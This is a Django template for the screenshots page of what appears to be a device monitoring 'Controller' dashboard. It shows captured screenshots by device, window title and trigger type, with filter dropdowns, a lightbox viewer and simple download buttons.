{% extends 'base.html' %}

{% block title %}Screenshots - Controller{% endblock %}
{% block page_title %}Screenshots{% endblock %}

{% block content %}
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
    <p style="color: var(--text-secondary); font-size: 14px;">
        All screenshots captured across devices
    </p>
    <div style="display: flex; gap: 12px; align-items: center;">
        <select id="deviceFilter" style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 16px; color: var(--text-primary); font-size: 14px;" onchange="filterScreenshots()">
            <option value="">All Devices</option>
            {% for device in devices %}
            <option value="{{ device.device_id }}">{{ device.hostname }}</option>
            {% endfor %}
        </select>
        <select id="triggerFilter" style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 16px; color: var(--text-primary); font-size: 14px;" onchange="filterScreenshots()">
            <option value="">All Triggers</option>
            <option value="browser">Browser</option>
            <option value="command">Command</option>
            <option value="scheduled">Scheduled</option>
        </select>
        <button class="btn btn-secondary" onclick="location.reload()">
            <i class="ph ph-arrows-clockwise"></i>
            Refresh
        </button>
    </div>
</div>

<div class="card fade-in">
    <div class="card-body">
        <div id="screenshotGrid" class="screenshot-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;">
            {% for screenshot in screenshots %}
            <div class="screenshot-item" data-device="{{ screenshot.device.device_id }}" data-trigger="{{ screenshot.trigger_type }}" style="cursor: pointer; transition: all 0.2s;" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
                <div style="aspect-ratio: 16/10; background: var(--bg-tertiary); border-radius: var(--radius-lg); overflow: hidden; position: relative;" onclick="viewScreenshot('{{ screenshot.secure_url }}')">
                    <img src="{{ screenshot.secure_url }}" alt="Screenshot" style="width: 100%; height: 100%; object-fit: cover;" loading="lazy">
                    <div style="position: absolute; top: 12px; left: 12px;">
                        <span class="badge badge-info" style="backdrop-filter: blur(8px); background: rgba(59, 130, 246, 0.8);">{{ screenshot.trigger_type }}</span>
                    </div>
                    <div style="position: absolute; bottom: 0; left: 0; right: 0; padding: 16px; background: linear-gradient(transparent, rgba(0,0,0,0.9));">
                        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
                            <i class="ph ph-desktop" style="color: rgba(255,255,255,0.7);"></i>
                            <span style="font-size: 13px; color: white; font-weight: 500;">{{ screenshot.device.hostname }}</span>
                        </div>
                        <div style="font-size: 12px; color: rgba(255,255,255,0.6); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ screenshot.active_window_title|default:"Unknown Window" }}</div>
                    </div>
                </div>
                <div style="padding: 12px 4px; display: flex; justify-content: space-between; align-items: center;">
                    <div style="font-size: 12px; color: var(--text-muted);">{{ screenshot.captured_at|date:"M d, Y H:i" }}</div>
                    <div style="display: flex; gap: 4px;">
                        <button class="btn btn-secondary btn-icon btn-sm" title="Download" onclick="downloadScreenshot('{{ screenshot.secure_url }}')">
                            <i class="ph ph-download"></i>
                        </button>
                        <button class="btn btn-secondary btn-icon btn-sm" title="Full View" onclick="viewScreenshot('{{ screenshot.secure_url }}')">
                            <i class="ph ph-arrows-out"></i>
                        </button>
                    </div>
                </div>
            </div>
            {% empty %}
            <div style="grid-column: 1 / -1;">
                <div class="empty-state" style="padding: 80px 20px;">
                    <i class="ph ph-camera" style="font-size: 64px;"></i>
                    <h3 style="margin-top: 16px;">No screenshots captured</h3>
                    <p>Screenshots will appear here once devices start capturing.</p>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
</div>

<!-- Lightbox Modal -->
<div id="lightbox" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; cursor: pointer;" onclick="closeLightbox()">
    <button style="position: absolute; top: 20px; right: 20px; background: none; border: none; color: white; font-size: 32px; cursor: pointer;">
        <i class="ph ph-x"></i>
    </button>
    <img id="lightboxImg" src="" style="max-width: 95%; max-height: 95%; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: var(--radius-lg);">
</div>
{% endblock %}

{% block extra_js %}
<script>
function filterScreenshots() {
    const deviceFilter = document.getElementById('deviceFilter').value;
    const triggerFilter = document.getElementById('triggerFilter').value;
    
    document.querySelectorAll('.screenshot-item').forEach(item => {
        const device = item.dataset.device;
        const trigger = item.dataset.trigger;
        
        let showByDevice = !deviceFilter || device === deviceFilter;
        let showByTrigger = !triggerFilter || trigger === triggerFilter;
        
        item.style.display = (showByDevice && showByTrigger) ? 'block' : 'none';
    });
}

function viewScreenshot(url) {
    document.getElementById('lightboxImg').src = url;
    document.getElementById('lightbox').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
    document.body.style.overflow = '';
}

function downloadScreenshot(url) {
    window.open(url, '_blank');
}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeLightbox();
});
</script>
{% endblock %}
